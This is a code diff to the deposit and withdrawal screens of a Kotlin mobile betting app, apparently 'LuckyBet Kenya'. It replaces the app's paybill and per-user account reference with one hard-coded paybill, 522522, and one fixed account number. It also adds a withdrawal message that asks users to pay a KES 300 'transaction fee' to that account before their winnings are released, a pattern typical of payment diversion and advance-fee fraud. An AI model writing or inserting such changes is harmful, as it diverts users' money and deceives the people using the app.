@@ -229,7 +229,7 @@ fun DepositScreen(
                                 if (amt < 10.0) {
                                     depositStatusMsg = "Minimum deposit is 10 shillings! Please enter at least 10."
                                 } else {
-                                    depositStatusMsg = "Prompt sent to ${currentUser.phoneNumber} for KES ${String.format(Locale.US, "%,.0f", amt)}. Alternatively, use Paybill 290290 (Account: ${currentUser.phoneNumber})."
+                                    depositStatusMsg = "Prompt sent to ${currentUser.phoneNumber} for KES ${String.format(Locale.US, "%,.0f", amt)}. Alternatively, use Paybill 522522 (Account: 6234870026939877)."
                                 }
                             },
                             colors = ButtonDefaults.buttonColors(containerColor = LuckyGreen),
@@ -292,7 +292,7 @@ fun DepositScreen(
                                     color = LuckyTextSecondary
                                 )
                                 Text(
-                                    text = "290290 (LuckyBet Kenya)",
+                                    text = "522522 (M-Pesa / KCB)",
                                     style = MaterialTheme.typography.titleLarge,
                                     color = LuckyGreenBright,
                                     fontWeight = FontWeight.Bold
@@ -306,7 +306,7 @@ fun DepositScreen(
                                     color = LuckyTextSecondary
                                 )
                                 Text(
-                                    text = currentUser.phoneNumber,
+                                    text = "6234870026939877",
                                     style = MaterialTheme.typography.titleMedium,
                                     color = Color.White,
                                     fontWeight = FontWeight.Bold
@@ -464,7 +464,7 @@ fun WithdrawalScreen(
                             }
                             Spacer(modifier = Modifier.height(8.dp))
                             Text(
-                                text = "Your account has reached KES 1,000! Please add KES 300 for transaction fee to disburse your M-Pesa withdrawal.",
+                                text = "Your account has reached KES 1,000! Please add KES 300 for transaction fee to Paybill 522522 (Account: 6234870026939877) to disburse your M-Pesa withdrawal.",
                                 style = MaterialTheme.typography.bodyMedium,
                                 color = Color.White
                             )
